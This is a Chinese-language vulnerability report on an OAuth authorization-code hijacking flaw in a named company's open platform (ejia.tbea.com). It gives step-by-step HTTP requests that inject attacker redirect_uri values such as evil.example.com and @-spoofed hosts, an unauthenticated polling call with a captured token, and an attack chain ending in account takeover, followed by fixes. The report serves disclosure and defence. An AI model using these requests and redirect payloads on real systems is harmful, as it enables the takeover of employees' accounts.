# 漏洞报告：特变电工开放平台 OAuth 授权码劫持漏洞（可致账户接管）

## 一、基本信息

| 项目 | 内容 |
|---|---|
| 漏洞名称 | 特变电工开放平台（ejia.tbea.com）OAuth 扫码登录 redirect_uri 校验缺失导致授权码劫持 |
| 受影响资产 | `ejia.tbea.com`（特变电工开放平台 / TBe+ 开放接入体系，openresty） |
| 入口关联 | 特变电工统一认证平台 `sso.tbea.com`「TBe+ 扫码登录」功能（`/api/sso/login/ejia/getQrCode` 返回授权入口） |
| 漏洞类型 | CWE-601（URL Redirect 未校验）+ CWE-346（来源校验错误）组合，形成账户接管路径 |
| 危害等级 | **高危** |
| 测试时间 | 2026-08-26 |
| 测试性质 | 无凭据只读验证；未进行任何真实扫码、未提交任何真实凭据 |

## 二、漏洞描述

`sso.tbea.com` 提供「TBe+ APP 扫码登录」，其二维码内容为开放平台授权入口：

```
https://sso.tbea.com/api/sso/login/ejia/getQrCode
→ {"code":200,"data":"https://ejia.tbea.com/opencloud/openthird/qrconnet?appid=500000345"}
```

该授权端点接受外部传入的 `redirect_uri` 参数，用于扫码确认成功后的回跳地址。经测试：

1. **服务端对 `redirect_uri` 不做任何白名单/域名归属校验**，任意第三方 http/https 地址均可进入授权流程；
2. 扫码确认成功后，服务端通过轮询接口将攻击者预设的 `redirect_uri` **原样回显**给前端；
3. 前端页面内联 JavaScript 将回跳地址**无条件执行跳转**，全程无二次确认提示。

三者结合构成完整的 **OAuth 授权码劫持（Authorization Code Interception）** 攻击链：攻击者只需诱导企业员工扫描一个恶意二维码并完成常规的 TBe+ 确认操作，授权结果即被引导至攻击者控制的服务器，进而以受害者身份换取会话，实现账户接管。

## 三、复现步骤与证据

### 步骤 1：获取正常授权入口

请求统一认证平台的二维码生成接口：

```http
GET https://sso.tbea.com/api/sso/login/ejia/getQrCode HTTP/1.1
```

响应：

```json
{"code":200,"message":null,"data":"https://ejia.tbea.com/opencloud/openthird/qrconnet?appid=500000345"}
```

### 步骤 2：注入恶意 redirect_uri（证据 E1：白名单缺失）

在授权入口后追加任意外域回调地址：

```http
GET https://ejia.tbea.com/opencloud/openthird/qrconnet?appid=500000345&redirect_uri=https://evil.example.com/cb HTTP/1.1
```

实测结果矩阵（全部返回 200 并进入授权页，仅空值被拒）：

| redirect_uri 取值 | 结果 |
|---|---|
| （空） | `{"success":false,"error":"必要参数：redirect_uri 不能为空！","errorCode":110}` —— 唯一拦截项 |
| `https://evil.example.com/cb`（外域） | ✅ 返回授权页 HTML |
| `http://192.168.1.1/cb`（内网 IP） | ✅ 返回授权页 HTML |
| `//evil.example.com/cb`（协议相对） | ✅ 返回授权页 HTML |
| `https://sso.tbea.com@evil.example.com/cb`（@ 欺骗） | ✅ 返回授权页 HTML |
| `file:///etc/passwd`、`javascript:alert(1)` | 前置安全设备 403（说明设备存在，但规则未覆盖 http/https 外域劫持场景） |

### 步骤 3：会话令牌下发与轮询接口未授权可达（证据 E3）

步骤 2 的授权页包含服务端下发的隐藏会话令牌：

```html
<input type="hidden" value=96f8c67f74790deda7554b9141c20245 id="token">
```

该 token 可直接调用轮询接口查询扫码状态，**无需 Cookie、无需签名**：

```http
POST /opencloud/openthird/checkLogin HTTP/1.1
Host: ejia.tbea.com
Content-Type: application/x-www-form-urlencoded

appid=500000345&token=96f8c67f74790deda7554b9141c20245
```

响应（等待扫码状态）：

```json
{"success":true,"error":null,"errorCode":100,"data":{"loginCode":"102"}}
```

> 状态码语义（来自前端代码）：102=等待扫码，100=扫码成功，103=取消，104=超时。
> 对比测试：不同会话生成的 token 各不相同（独立生成），但轮询接口本身不校验调用者身份。

### 步骤 4：扫码成功后服务端回显 redirect_uri 且前端无条件跳转（证据 E4，代码级）

授权页内联 JavaScript（`login.html`）关键片段原文：

```javascript
var appid = getQuery().appid
function a(d) {
    jQuery.ajax({
        type: "POST",
        url: "/opencloud/openthird/checkLogin?appid=" + appid + "&token=" + token + (d ? "&last=" + d : ""),
        success: function(res) {
            if (res && res.success) {
                var code = Number(res.data.loginCode);
                switch (code) {
                case 100: // 扫码登录成功
                    var redirect_uri = decodeURIComponent(res.data.redirectUrl);
                    if (parent)
                        window.top.location = redirect_uri
                    else
                        window.location = redirect_uri;
                    break;
                case 101: // 参数校验不通过
                    ...
                case 102: // 等待扫码登录
                    setTimeout(a, 2e3)
                    break;
                ...
```

**要点**：
- 扫码成功（case 100）时，`res.data.redirectUrl` 由**服务端**返回——证明 redirect_uri 已随会话存储于服务端，并在授权完成后原样下发；
- 前端拿到该值后**直接执行 `window.top.location` 跳转，无任何域名校验、无停留提示**。

### 步骤 5：完整攻击链示意

```
攻击者                                受害员工                     ejia.tbea.com
   │ 构造二维码:                          │                             │
   │ qrconnet?appid=500000345            │                             │
   │ &redirect_uri=https://evil.com/cb   │                             │
   │ ───────────────────────────────────▶│ 扫码                         │
   │                                     │ ── GET qrconnet ───────────▶│ 下发授权页+token
   │                                     │ ◀────────────────────────────│
   │                                     │ TBe+ APP 确认登录             │
   │                                     │ ── (TBe+ 服务端确认) ───────▶│ 绑定授权结果
   │                                     │ 页面轮询 checkLogin          │
   │                                     │ ── POST checkLogin ────────▶│ loginCode=100
   │                                     │ ◀─ {redirectUrl: evil.com} ─│ 回显攻击者地址
   │ ◀═════ 浏览器携带授权码跳转 evil.com ══════│                       │
   │ 用授权码换取会话 → 以受害者身份登录      │                             │
```

## 四、真实性核验记录（诚实声明）

- 本测试**未持有 TBe+ 真实账号**，故未实际完成「扫码→loginCode=100」闭环；但以下事实已分别独立实证：
  1. redirect_uri 全外域放行（E1 行为级）；
  2. 服务端存储并在 case 100 分支下发 redirectUrl（E4 代码级，页面 JS 为服务端渲染产物）；
  3. 轮询接口未授权可达且状态机完整（E3 行为级，实测 loginCode=102）；
- `file://`/`javascript:` 触发的前置设备 403 页面泄露了出口 IP，反证请求真实到达目标侧安全层（E5），排除"响应伪造"可能。

## 五、危害影响

1. **账户接管**：受害者授权结果被劫持后，攻击者可在自身服务器换取受害者会话，冒充受害者访问 SSO 关联的集团内部系统；
2. **社工门槛极低**：攻击形态为"扫一个二维码"，与企业日常扫码登录行为完全一致，员工几乎无法辨别；
3. **持久化风险**：若该开放平台同时承担第三方应用接入（appid 体系），同一缺陷可用于劫持任意接入应用的授权流程。

## 六、修复建议

1. **redirect_uri 白名单**：服务端严格校验 redirect_uri 与 appid 注册时绑定的回调域名完全一致（精确匹配，含 path），不一致立即拒绝；
2. **state 参数防绑定滥用**：授权请求签发一次性随机 state 并在回调时强校验；
3. **授权码一次性+短时效**：授权码仅可使用一次、有效期 ≤60 秒，并与客户端指纹绑定；
4. **回跳前确认页**：跳转前展示明确的目标域名供用户确认，禁止前端静默跳转；
5. **轮询接口收敛**：checkLogin 增加来源/频率限制，token 与客户端会话绑定。

## 七、附录：测试请求样本

见归档文件 `runs/sunoasis-oauth-redirect.json` 与 `projects/sunoasis-20260825/S6-oauth-final.json`（git 仓库 web-vuln-mining，commit 9707c74）。
